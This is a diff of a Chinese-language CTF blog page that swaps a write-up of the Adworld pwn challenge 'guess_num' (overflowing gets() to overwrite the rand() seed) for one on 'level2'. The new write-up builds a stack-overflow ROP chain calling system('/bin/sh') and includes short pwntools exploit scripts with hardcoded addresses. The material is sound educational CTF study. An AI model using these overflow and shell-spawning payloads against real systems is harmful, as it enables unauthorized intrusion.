@@ -20,31 +20,30 @@
     var CONFIG = {"hostname":"wai-whoami.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="攻防世界pwn题目 新手练习区guess_num 1.下载附件 2.IDA PRO打开，F5生成伪代码  3.分析这个程序进入sub_C3E()函数发现存在system(“cat flag”);于是，考虑使程序运行到这里，执行此代码。  我们返回去看看主函数，分析程序发现。如果需要进入sub_C3E()函数就需要输入10次和”rand()%6+1”相等的数字。使用rand()的前提是需要一个种子，">
+  <meta name="description" content="攻防世界pwn题目 新手练习区level2 1.下载附件 2.使用IDA PRO打开，F5生成伪代码 3.分析程序 进入第一个函数发现存在栈溢出漏洞(程序未对用户输入做检查)  此时考虑利用栈溢出，覆盖返回地址，调用system(“&#x2F;bin&#x2F;sh”); 在string中找到了‘bin&#x2F;sh’字符，于是考虑使用ROP面向返回的编程技术，构造system(“&#x2F;bin&#x2F;sh”)命令，因为system和&#x2F;">
 <meta property="og:type" content="article">
-<meta property="og:title" content="adworld-freshman-guess-num-wp">
-<meta property="og:url" content="https://wai-whoami.github.io/adworld-freshman-guess-num-wp/index.html">
+<meta property="og:title" content="adworld-freshman&#x2F;level2">
+<meta property="og:url" content="https://wai-whoami.github.io/adworld-freshman/level2/index.html">
 <meta property="og:site_name" content="lightyami&#39;s blogs">
-<meta property="og:description" content="攻防世界pwn题目 新手练习区guess_num 1.下载附件 2.IDA PRO打开，F5生成伪代码  3.分析这个程序进入sub_C3E()函数发现存在system(“cat flag”);于是，考虑使程序运行到这里，执行此代码。  我们返回去看看主函数，分析程序发现。如果需要进入sub_C3E()函数就需要输入10次和”rand()%6+1”相等的数字。使用rand()的前提是需要一个种子，">
+<meta property="og:description" content="攻防世界pwn题目 新手练习区level2 1.下载附件 2.使用IDA PRO打开，F5生成伪代码 3.分析程序 进入第一个函数发现存在栈溢出漏洞(程序未对用户输入做检查)  此时考虑利用栈溢出，覆盖返回地址，调用system(“&#x2F;bin&#x2F;sh”); 在string中找到了‘bin&#x2F;sh’字符，于是考虑使用ROP面向返回的编程技术，构造system(“&#x2F;bin&#x2F;sh”)命令，因为system和&#x2F;">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://wai-whoami.github.io/images/adworld-freshman-guess-num-wp/1.png">
-<meta property="og:image" content="https://wai-whoami.github.io/images/adworld-freshman-guess-num-wp/2.png">
-<meta property="og:image" content="https://wai-whoami.github.io/images/adworld-freshman-guess-num-wp/3.png">
-<meta property="og:image" content="https://wai-whoami.github.io/images/adworld-freshman-guess-num-wp/4.png">
-<meta property="og:image" content="https://wai-whoami.github.io/images/adworld-freshman-guess-num-wp/5.png">
-<meta property="og:image" content="https://wai-whoami.github.io/images/adworld-freshman-guess-num-wp/6.png">
-<meta property="og:image" content="https://wai-whoami.github.io/images/adworld-freshman-guess-num-wp/7.png">
-<meta property="og:image" content="https://wai-whoami.github.io/images/adworld-freshman-guess-num-wp/8.png">
-<meta property="og:image" content="https://wai-whoami.github.io/images/adworld-freshman-guess-num-wp/9.png">
-<meta property="og:image" content="https://wai-whoami.github.io/images/adworld-freshman-guess-num-wp/10.png">
-<meta property="og:image" content="https://wai-whoami.github.io/images/adworld-freshman-guess-num-wp/11.png">
-<meta property="article:published_time" content="2020-09-10T06:31:39.140Z">
-<meta property="article:modified_time" content="2020-10-12T12:02:54.669Z">
+<meta property="og:image" content="https://wai-whoami.github.io/images/level2/1.png">
+<meta property="og:image" content="https://wai-whoami.github.io/images/level2/2.png">
+<meta property="og:image" content="https://wai-whoami.github.io/images/level2/3.png">
+<meta property="og:image" content="https://wai-whoami.github.io/images/level2/4.png">
+<meta property="og:image" content="https://wai-whoami.github.io/images/level2/5.png">
+<meta property="og:image" content="https://wai-whoami.github.io/images/level2/6.png">
+<meta property="og:image" content="https://wai-whoami.github.io/images/level2/7.png">
+<meta property="og:image" content="https://wai-whoami.github.io/images/level2/8.png">
+<meta property="og:image" content="https://wai-whoami.github.io/images/level2/9.png">
+<meta property="og:image" content="https://wai-whoami.github.io/images/level2/10.png">
+<meta property="article:published_time" content="2020-09-08T13:53:42.523Z">
+<meta property="article:modified_time" content="2020-10-12T12:06:56.979Z">
 <meta property="article:author" content="lightyami">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://wai-whoami.github.io/images/adworld-freshman-guess-num-wp/1.png">
+<meta name="twitter:image" content="https://wai-whoami.github.io/images/level2/1.png">
 
-<link rel="canonical" href="https://wai-whoami.github.io/adworld-freshman-guess-num-wp/">
+<link rel="canonical" href="https://wai-whoami.github.io/adworld-freshman/level2/">
 
 
 <script id="page-configurations">
@@ -57,7 +56,7 @@
   };
 </script>
 
-  <title>adworld-freshman-guess-num-wp | lightyami's blogs</title>
+  <title>adworld-freshman/level2 | lightyami's blogs</title>
   
 
 
@@ -162,7 +161,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://wai-whoami.github.io/adworld-freshman-guess-num-wp/">
+    <link itemprop="mainEntityOfPage" href="https://wai-whoami.github.io/adworld-freshman/level2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -175,7 +174,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          adworld-freshman-guess-num-wp
+          adworld-freshman/level2
         </h1>
 
         <div class="post-meta">
@@ -185,14 +184,14 @@
               </span>
               <span class="post-meta-item-text">Posted on</span>
 
-              <time title="Created: 2020-09-10 14:31:39" itemprop="dateCreated datePublished" datetime="2020-09-10T14:31:39+08:00">2020-09-10</time>
+              <time title="Created: 2020-09-08 21:53:42" itemprop="dateCreated datePublished" datetime="2020-09-08T21:53:42+08:00">2020-09-08</time>
             </span>
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-10-12 20:02:54" itemprop="dateModified" datetime="2020-10-12T20:02:54+08:00">2020-10-12</time>
+                <time title="Modified: 2020-10-12 20:06:56" itemprop="dateModified" datetime="2020-10-12T20:06:56+08:00">2020-10-12</time>
               </span>
 
           
@@ -206,29 +205,28 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>攻防世界pwn题目 <a href="https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5057&page=1" target="_blank" rel="noopener">新手练习区guess_num</a></p>
-<h3 id="1-下载附件"><a href="#1-下载附件" class="headerlink" title="1.下载附件"></a>1.下载附件</h3><p><img src="/images/adworld-freshman-guess-num-wp/1.png" alt="Alt text" title="Optional title"></p>
-<h3 id="2-IDA-PRO打开，F5生成伪代码"><a href="#2-IDA-PRO打开，F5生成伪代码" class="headerlink" title="2.IDA PRO打开，F5生成伪代码"></a>2.IDA PRO打开，F5生成伪代码</h3><p><img src="/images/adworld-freshman-guess-num-wp/2.png" alt="Alt text" title="Optional title"></p>
-<p><img src="/images/adworld-freshman-guess-num-wp/3.png" alt="Alt text" title="Optional title"></p>
-<h3 id="3-分析这个程序"><a href="#3-分析这个程序" class="headerlink" title="3.分析这个程序"></a>3.分析这个程序</h3><p>进入sub_C3E()函数发现存在<br><strong><em>system(“cat flag”);</em></strong><br>于是，考虑使程序运行到这里，执行此代码。</p>
-<p><img src="/images/adworld-freshman-guess-num-wp/4.png" alt="Alt text" title="Optional title"></p>
-<p>我们返回去看看主函数，分析程序发现。<br>如果需要进入sub_C3E()函数就需要输入10次和”rand()%6+1”相等的数字。<br>使用rand()的前提是需要一个种子，才能生成随机数。<br>而srand()是用来生成随机数的种子的函数。</p>
-<p><img src="/images/adworld-freshman-guess-num-wp/5.png" alt="Alt text" title="Optional title"></p>
-<p>根据rand()函数的生成原理，srand()生成种子的参数若相同时，则每一次产生的随机数也一致。</p>
-<h4 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路"></a>整体思路</h4><p>利用gets()函数，对v7变量输入大量字符，溢出至seed[]处。<br>确定了seed[0]的值后，在Linux系统中进行编程，获取10次生成的数字。<br>再写入脚本，获取flag(不同系统生成的结果不同)</p>
-<p><img src="/images/adworld-freshman-guess-num-wp/6.png" alt="Alt text" title="Optional title"></p>
-<h3 id="4-编写payload"><a href="#4-编写payload" class="headerlink" title="4.编写payload"></a>4.编写payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(&quot;ip&#x2F;url&quot;,port)</span><br><span class="line">p.sendline(&quot;a&quot;*0x20+p64(0));</span><br><span class="line">num &#x3D; [&quot;x1&quot;,&quot;x2&quot;,&quot;x3&quot;,&quot;x4&quot;,&quot;x5&quot;,&quot;x6&quot;,&quot;x7&quot;,&quot;x8&quot;,&quot;x9&quot;,&quot;x10&quot;]</span><br><span class="line">for i in range(10):</span><br><span class="line">    sendlineafter(&quot;guess number:&quot;,num[i])</span><br><span class="line">p.interactive();</span><br></pre></td></tr></table></figure>
+        <p>攻防世界pwn题目 <a href="https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5055&page=1" target="_blank" rel="noopener">新手练习区level2</a></p>
+<h3 id="1-下载附件"><a href="#1-下载附件" class="headerlink" title="1.下载附件"></a>1.下载附件</h3><p><img src="/images/level2/1.png" alt="Alt text" title="Optional title"></p>
+<h3 id="2-使用IDA-PRO打开，F5生成伪代码"><a href="#2-使用IDA-PRO打开，F5生成伪代码" class="headerlink" title="2.使用IDA PRO打开，F5生成伪代码"></a>2.使用IDA PRO打开，F5生成伪代码</h3><p><img src="/images/level2/2.png" alt="Alt text" title="Optional title"></p>
+<h3 id="3-分析程序"><a href="#3-分析程序" class="headerlink" title="3.分析程序"></a>3.分析程序</h3><p><img src="/images/level2/3.png" alt="Alt text" title="Optional title"></p>
+<p>进入第一个函数发现存在栈溢出漏洞(程序未对用户输入做检查)</p>
+<p><img src="/images/level2/4.png" alt="Alt text" title="Optional title"></p>
+<p>此时考虑利用栈溢出，覆盖返回地址，调用system(“/bin/sh”);</p>
+<p>在string中找到了‘bin/sh’字符，于是考虑使用<br><strong><em>ROP</em></strong>面向返回的编程技术，构造<br><strong>system(“/bin/sh”)</strong><br>命令，因为system和/bin/sh都是程序内部的对象，所以利用面较为广泛</p>
+<p><img src="/images/level2/5.png" alt="Alt text" title="Optional title"></p>
+<p>寻找system函数地址</p>
+<p><img src="/images/level2/6.png" alt="Alt text" title="Optional title"></p>
+<p>进入查看，指令实参存储的偏移地址</p>
+<p><img src="/images/level2/7.png" alt="Alt text" title="Optional title"></p>
+<h4 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路"></a>整体思路</h4><p>利用ROP技术，构造调用系统的/bin/sh，进入系统shell，再来寻找flag</p>
+<h3 id="4-编写payload"><a href="#4-编写payload" class="headerlink" title="4.编写payload"></a>4.编写payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(&#39;ip&#x2F;url&#39;,port)</span><br><span class="line">p.send(&#39;a&#39;*140+p32(0x08048320)+&#39;a&#39;*4+p32(0x0804a024))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<h3 id="5-开始解题"><a href="#5-开始解题" class="headerlink" title="5.开始解题"></a>5.开始解题</h3><p>编写程序</p>
-<p><img src="/images/adworld-freshman-guess-num-wp/7.png" alt="Alt text" title="Optional title"></p>
-<p>运行程序</p>
-<p><img src="/images/adworld-freshman-guess-num-wp/8.png" alt="Alt text" title="Optional title"></p>
-<p>获取在线场景</p>
-<p><img src="/images/adworld-freshman-guess-num-wp/9.png" alt="Alt text" title="Optional title"></p>
+<h3 id="5-开始解题"><a href="#5-开始解题" class="headerlink" title="5.开始解题"></a>5.开始解题</h3><p>获取在线场景</p>
+<p><img src="/images/level2/8.png" alt="Alt text" title="Optional title"></p>
 <p>编写脚本</p>
-<p><img src="/images/adworld-freshman-guess-num-wp/10.png" alt="Alt text" title="Optional title"></p>
-<p>执行脚本，获取flag</p>
-<p><img src="/images/adworld-freshman-guess-num-wp/11.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/level2/9.png" alt="Alt text" title="Optional title"></p>
+<p>执行脚本，查看flag</p>
+<p><img src="/images/level2/10.png" alt="Alt text" title="Optional title"></p>
 
     </div>
 
@@ -244,12 +242,12 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/get_shell/" rel="prev" title="get_shell">
-      <i class="fa fa-chevron-left"></i> get_shell
+    <a href="/adworld-freshman/adworld-freshman-CGfsb-wp/" rel="prev" title="adworld-freshman/adworld-freshman-CGfsb-wp">
+      <i class="fa fa-chevron-left"></i> adworld-freshman/adworld-freshman-CGfsb-wp
     </a></div>
       <div class="post-nav-item">
-    <a href="/adworld-freshman-cgpwn2-wp/" rel="next" title="adworld-freshman-cgpwn2-wp">
-      adworld-freshman-cgpwn2-wp <i class="fa fa-chevron-right"></i>
+    <a href="/adworld-freshman/get_shell/" rel="next" title="adworld-freshman/get_shell">
+      adworld-freshman/get_shell <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
@@ -309,7 +307,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-下载附件"><span class="nav-number">1.</span> <span class="nav-text">1.下载附件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-IDA-PRO打开，F5生成伪代码"><span class="nav-number">2.</span> <span class="nav-text">2.IDA PRO打开，F5生成伪代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-分析这个程序"><span class="nav-number">3.</span> <span class="nav-text">3.分析这个程序</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#整体思路"><span class="nav-number">3.1.</span> <span class="nav-text">整体思路</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-编写payload"><span class="nav-number">4.</span> <span class="nav-text">4.编写payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-开始解题"><span class="nav-number">5.</span> <span class="nav-text">5.开始解题</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-下载附件"><span class="nav-number">1.</span> <span class="nav-text">1.下载附件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-使用IDA-PRO打开，F5生成伪代码"><span class="nav-number">2.</span> <span class="nav-text">2.使用IDA PRO打开，F5生成伪代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-分析程序"><span class="nav-number">3.</span> <span class="nav-text">3.分析程序</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#整体思路"><span class="nav-number">3.1.</span> <span class="nav-text">整体思路</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-编写payload"><span class="nav-number">4.</span> <span class="nav-text">4.编写payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-开始解题"><span class="nav-number">5.</span> <span class="nav-text">5.开始解题</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -323,7 +321,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-count">12</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
